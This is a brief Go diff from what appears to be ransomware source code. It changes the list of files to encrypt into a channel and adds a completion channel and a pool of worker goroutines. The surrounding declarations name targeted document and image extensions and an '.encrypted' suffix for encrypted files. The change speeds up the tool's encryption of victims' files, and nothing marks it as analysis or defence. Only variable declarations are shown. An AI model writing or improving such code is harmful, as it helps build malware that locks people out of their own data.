@@ -18,7 +18,13 @@ var (
 	InterestingExtensions = []string{"doc", "docx", "png", "jpeg", "jpg", "pdf", "txt", "svg", "gif"}
 
 	// Files to encrypt that match the extensions pattern
-	MatchedFiles []File
+	MatchedFiles = make(chan File)
+
+	// This channel receives true if all files are processed
+	Done = make(chan bool, 1)
+
+	// Workers processing the files
+	NumWorkers = 2
 
 	// Extension appended to files after encryption
 	EncryptionExtension = ".encrypted"
